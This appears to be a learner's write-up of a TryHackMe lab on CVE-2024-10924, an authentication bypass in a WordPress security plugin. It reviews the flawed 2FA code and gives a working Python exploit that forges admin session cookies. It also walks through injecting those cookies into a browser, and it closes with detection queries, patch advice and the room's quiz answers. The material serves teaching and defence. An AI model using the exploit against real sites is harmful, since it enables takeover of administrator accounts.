
#Easy #FreeRoom #wordpress 

https://tryhackme.com/room/bypassreallysimplesecurity

WordPress is one of the most popular open-source Content Management Systems (CMS) and it is widely used to build websites ranging from blogs to e-commerce platforms. In November 2024, a critical vulnerability was discovered in the [Really Simple Security plugin](https://really-simple-ssl.com/), a widely adopted security plugin used by millions of websites. The vulnerability allowed attackers to bypass authentication and gain unauthorised access to user accounts, including those with administrative privileges. Since WordPress is a CMS, gaining administrative access sometimes allows you even to perform privilege escalation and get complete control of the server/network. Discovered by István Márton from [Wordfence](https://www.wordfence.com/threat-intel/vulnerabilities/detail/really-simple-security-free-pro-and-pro-multisite-900-9111-authentication-bypass), this flaw was assigned a critical severity rating and CVE-ID 2024-10924.

## how it works

The vulnerability in CVE-2024-10924 arises due to non-adherence to secure coding practices while handling REST API endpoints in the WordPress Really Simple Security plugin. This plugin is widely used to add additional security measures, including Two-Factor Authentication (2FA). Unfortunately, improper validation during the authentication process allows attackers to exploit API endpoints and bypass critical checks.

### WordPress Entry Points

WordPress offers various entry points for interaction:

- **Admin Dashboard**: Used for administrative management via the `/wp-admin` endpoint. Only authenticated users with valid credentials can access this interface.
- **Public Interface**: Managed by the index.php file in the root directory, it serves content to visitors.
- **REST API**: The API provides a flexible entry point for developers to manage site data programmatically. It requires proper authentication to access sensitive resources.

The CVE-2024-10924 vulnerability targets REST API endpoints configured for the plugin’s Two-Factor Authentication (2FA) mechanism. It enables attackers to bypass authentication by manipulating parameters used during API interactions. The vulnerability occurred due to insufficient validation of user-supplied values, specifically in the `skip_onboarding` feature.

### How the Vulnerability Works

To understand how the vulnerability works, let's have a source code review to understand the control flow through the different pages. You can review the source code in the `/var/www/html/wp-content/plugins/really-simple-ssl/security/wordpress/two-fa` folder in the attached VM. The plugin contains a PHP class called `Rsssl_Two_Factor_On_Board_Api`,  which includes the following essential methods that lead to a bypassing authentication vulnerability:

```
skip_onboarding 
L check_login_and_get_user()
	L user_id
	L login_nonce
		L pass OR fail
			L authenticate_and_redirect()
```

- **skip_onboarding**: Skips or manages the 2FA onboarding process for a user by validating their credentials and redirecting them after authentication. It begins by extracting parameters from the request, including `user_id`, `login_nonce`, and `redirect_to`. These parameters are then passed to the `check_login_and_get_user` function for validation. If a valid user object is returned, the method calls `authenticate_and_redirect`, redirecting the user to the `redirect_to` URL.

```php
/** 
* Skips the onboarding process for the user. 
* @param WP_REST_Request $request The REST request object. 
* @return WP_REST_Response The REST response object. 
*/ 
public function skip_onboarding( WP_REST_Request $request ): WP_REST_Response { 
	$parameters = new Rsssl_Request_Parameters( $request ); 
	// As a double we check the user_id with the login nonce. 
	$user = $this->check_login_and_get_user( (int)$parameters
	>user_id, $parameters->login_nonce ); return $this
	>>authenticate_and_redirect( $parameters->user_id, $parameters
	>>>redirect_to );
```

The vulnerability lies in the `skip_onboarding` method not validating the return value of `check_login_and_get_user`. Even if the function returns null, indicating invalid credentials, the process redirects the user, granting unauthorised access. The call to `skip_onboarding` is carried out through the REST API endpoint `/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding` with POST parameters **user_id**, **login_none** and **redirect_to** URL.

- **check_login_and_get_user**: The `check_login_and_get_user` function is responsible for validating the **user_id** and **login_nonce**. It first checks the validity of the **login_nonce** using the **verify_login_nonce function**. If the nonce is invalid, it returns null, ensuring an authentication failure. If the nonce is valid, it retrieves the user object associated with the provided **user_id** and returns it.

```php
/** 
* Verifies a login nonce, gets user by the user id, and returns an error response if any steps fail. 
* @param int $user_id The user ID. 
* @param string $login_nonce The login nonce. 
* @return WP_User|WP_REST_Response 
**/ 
private function check_login_and_get_user( int $user_id, string $login_nonce ) { if ( ! Rsssl_Two_Fa_Authentication::verify_login_nonce( $user_id, $login_nonce ) ) { return new WP_REST_Response( array( 'error' => 'Invalid login nonce' ), 403 ); }
```

The problem arises because `skip_onboarding` does not properly handle the null response from this function. While the function does its job of identifying invalid credentials, the calling method ignores its return value, allowing the process to continue as if the authentication was successful.

- **authenticate_and_redirect**: This function redirects the user after successful authentication. It assumes that the earlier methods have already authenticated the user. It uses the **user_id** and **redirect_to** parameters to redirect the user to the desired URL.

```php
/** 
* Sets the authentication cookie and returns a success response. 
* @param int $user_id The user ID. 
* @param string $redirect_to The redirect URL. 
* @return WP_REST_Response 
* */ 
private function authenticate_and_redirect( int $user_id, string $redirect_to = '' ): WP_REST_Response { 
// Okay checked the provider now authenticate the user.
	wp_set_auth_cookie( $user_id, true ); 
// Finally redirect the user to the redirect_to page or to the home page if the redirect_to is not set. 
	$redirect_to = $redirect_to ?: home_url(); return new 
	WP_REST_Response( array( 'redirect_to' => $redirect_to ), 200 ); 
}
```

However, this function is called even if authentication fails. Therefore, the attacker is seamlessly redirected to the desired page, bypassing the authentication mechanism. Such instances are the first of their kind, and normally, such security flaws have never been seen in a renowned plugin.

> [!info] It is important to note that the vulnerability only works for the accounts against whom 2FA is **enabled**. The chain of methods reveals how improper validation leads to a critical security flaw:

- In **skip_onboarding**: The return value from `check_login_and_get_user` is not validated, allowing a **null** response to be treated as a valid user.
- In **check_login_and_get_user**: While it correctly identifies invalid credentials, it relies on the caller to handle its return value, which does not happen.
- In **authenticate_and_redirect**: It blindly redirects users based on the parameters passed to it, assuming they have been properly authenticated.

Now that we understand the concept behind the vulnerability, let's exploit it in the next task.

```
What is the class name that holds the important three functions discussed in the task?

Rsssl_Two_Factor_On_Board_Api

What is the function name that accepts user_id and login_nonce as arguments and validates them?

check_login_and_get_user
```

## how to exploit

In this task, we will learn how to exploit CVE-2024-10924. Exploiting of this vulnerability is straightforward and involves sending a crafted POST request to the vulnerable `/reallysimplessl/v1/two_fa/skip_onboarding` endpoint. From the previous task, we learned that the endpoint accepts three key parameters: the user's ID attempting to skip 2FA onboarding, a nonce value which is not validated correctly, and the URL to redirect the user after the operation.

```
WordPress user
L POST /reallysimplessl/v1/two_fa/skip_onboarding
  L WordPress
     L user_id=1
     L redirect_to=/
     L login_nonce=random
```

### Exploitation

In the attached VM, open the browser and visit the website [http://vulnerablewp.thm:8080/wp-admin](http://vulnerablewp.thm:8080/wp-admin). We will see that the website is protected through a login panel. Our goal is to retrieve credentials against a WordPress user admin with **user_id** 1.

```
WordPress
Username or Email: admin
Password:
[Log In]
```

Below is a simple Python script that sends a POST request to the vulnerable endpoint. This script extracts and displays the cookies in response to authenticate the user.

```python
import requests 
import urllib.parse 
import sys 

if len(sys.argv) != 2: 
	print("Usage: python exploit.py <user_id>") 
	sys.exit(1) 
	
user_id = sys.argv[1] 
url = "http://vulnerablewp.thm:8080/rest_route=/reallysimplessl/v1/two_fa/skip_onboarding" 

data = { 
		"user_id": int(user_id), # User ID from the argument
		"login_nonce": "invalid_nonce", # Arbitrary value
		"redirect_to": "/wp-admin/" # Target redirection 
} 

# Sending the POST request 
response = requests.post(url, json=data) 

# Checking the response 
if response.status_code == 200: 
	print("Request successful!\n") 
	# Extracting cookies 
	cookies = response.cookies.get_dict() 
	count = 1 
	
	for name, value in cookies.items(): 
		# Decode the URL-encoded cookie value
		decoded_value = urllib.parse.unquote(value)  
		print(f"Cookie {count}:") 
		print(f"Cookie Name: {name}") 
		print(f"Cookie Value: {decoded_value}\n") 
		count += 1 
	
else: 
	print("Request failed!") 
	print(f"Status Code: {response.status_code}") 
	print(f"Response Text: {response.text}")
```

The above Python code is already available on the **Desktop** of the attached VM with the name `exploit.py`. Open the terminal and execute the script using the the following command:

```python
python3 exploit.py 1
```

```
Cookie 1:
Cookie Name: wordpress_logged_in_eb51341dc89ca85477118d98a618ef6f
Cookie Value: admin|1739982470|Q88u2tRrpSrLBiNhNFTf2i4Z73RaQUFYNJtKyE4JK2C|53f5d846ce437d0391b20596d934fe55069c6d573a4e703c08664dcfa6849354

Cookie 2:
Cookie Name: wordpress_eb51341dc89ca85477118d98a618ef6f
Cookie Value: admin|1739982470|Q88u2tRrpSrLBiNhNFTf2i4Z73RaQUFYNJtKyE4JK2C|0f2e902d25dec10599b9518917964dd05e4e20ea58af7002b35177f59760f502

```
### From Cookies to Admin Login

Now, we will use the cookies retrieved earlier to log in as admin on the WordPress site. While on the `vulnerablewp.thm:8080` page, you can manually inject the cookies into Firefox. To do this, right-click on the page and select **Inspect**, then open the browser's developer tools.

```
browser > Inspect > Storage > Cookies 

Select  http://vulnerablewp.thm:8080 >  + (add new row)

doublie click on new row Name

---------------------------
Name: wordpress_eb51341dc89ca85477118d98a618ef6f
Value: admin|1739982470|Q88u2tRrpSrLBiNhNFTf2i4Z73RaQUFYNJtKyE4JK2C|0f2e902d25dec10599b9518917964dd05e4e20ea58af7002b35177f59760f502
---------------------------

http://vulnerablewp.thm:8080/wp-admin/  ---> press Enter

```
This will apply the injected cookies to your session. When the page reloads, you should be logged in as the **user_id** 1. If everything was done correctly, you will see the admin interface

Once logged in as the **user_id** 1, navigate to [http://vulnerablewp.thm:8080/wp-admin/profile.php ] link to get details about your profile, such as your username, email address, and personal settings.

> [!info] There are multiple ways to add cookies in the browser. If you have difficulty using the above method, you can add cookies to the browser using an extension like **Cookiebro Editor**. Follow the steps provided in the extension below to add or edit cookies. Ensure the expiration date for the cookies is set to a future value to keep them valid.

```
# user_id 2
python3 exploit.py

Cookie 1:
Cookie Name: wordpress_logged_in_eb51341dc89ca85477118d98a618ef6f
Cookie Value: tesla|1739983938|oMTKW0ETWwmEYpwn2o1qV61h6p0jrPyc6X5AFxZTyHA|2624093f94f9df9ad6c89ce6dbfed76b04848a7263ccf13655f46a741040b465

Cookie 2:
Cookie Name: wordpress_eb51341dc89ca85477118d98a618ef6f
Cookie Value: tesla|1739983938|oMTKW0ETWwmEYpwn2o1qV61h6p0jrPyc6X5AFxZTyHA|55ca71639f58cc54f8fa7187ad2d774891240bc8ccf9671a03a500da67c1ef94

http://vulnerablewp.thm:8080/wp-admin/
```

```
What email address is associated with the username admin (**user_id** 1)?

admin@fake.thm

What is the first name value for the username tesla (**user_id** 2)?

jack  tesla   tesla@email.thm

What is the HTTP method required for exploiting the vulnerability? (GET/POST)

post
```

## detection and mitigation

In the previous task, we learned that the vulnerability in CVE-2024-10924 can be exploited by making a simple API call to a specific endpoint. Now, we will discuss a few detection and mitigation techniques. The challenge lies in detecting such exploitation, as legitimate API calls to the endpoint can also occur, making distinguishing between normal and malicious activity difficult.

### Examining Logs

To identify exploitation attempts of CVE-2024-10924, we can rely on various logs that capture API activity, events, etc. Below are some methods to examine logs for potential exploitation:

- **Check Weblogs for API Calls**: Focus on detecting requests to the vulnerable endpoint, `/rest_route=/reallysimplessl/v1/two_fa/skip_onboarding` with unusual patterns like repeated POST requests to the endpoint, requests with varying `user_id`  or `login_nonce` parameters, indicating brute force attempts, etc.
- **Analyse Authentication Logs**: Look for login attempts where **two-factor authentication** is bypassed. Indicators of potential exploitation include failed login attempts followed by a sudden successful login without 2FA validation, logins to administrative accounts from unexpected geolocations or devices, etc.
- **SIEM Query**: If you are using a **SIEM solution** like OpenSearch, create a query to filter and visualise logs for potential exploitation attempts. A sample query could be:
- 
```c
method:POST AND path:"/reallysimplessl/v1/two_fa/skip_onboarding"
```

> [! info] **Note**: 
> If the above query generates results, it does not necessarily confirm exploitation. However, when combined with other indicators, like previous suspicious requests, it can provide better insight into potential attacks.

### Mitigation Steps

As part of the mitigation process, the developers of the Really Simple Security plugin have officially released a [patch](https://github.com/Really-Simple-Plugins/really-simple-ssl/blob/master/) addressing CVE-2024-10924. A source code review of the updated version reveals that additional validation and error-handling steps have been implemented to handle the authentication bypass.

Here are some additional mitigation measures to secure your website:

- **Apply the Official Patch**: Update the Really Simple Security plugin to version 9.1.2 or later, which includes a fix for the vulnerability and also enables **auto updates**.
- Update the alerts in the SIEM so you are notified as soon as an exploitation attempt is made.
- Developers must implement proper input validation and rigorous error handling for all API endpoints to prevent the processing of malicious or invalid parameters.

```
As a security engineer, you have identified a call to the **/reallysimplessl/v1/two_fa/skip_onboarding** endpoint from weblogs. Does that confirm that the user is 100% infected? (yea/nay)

nay

```

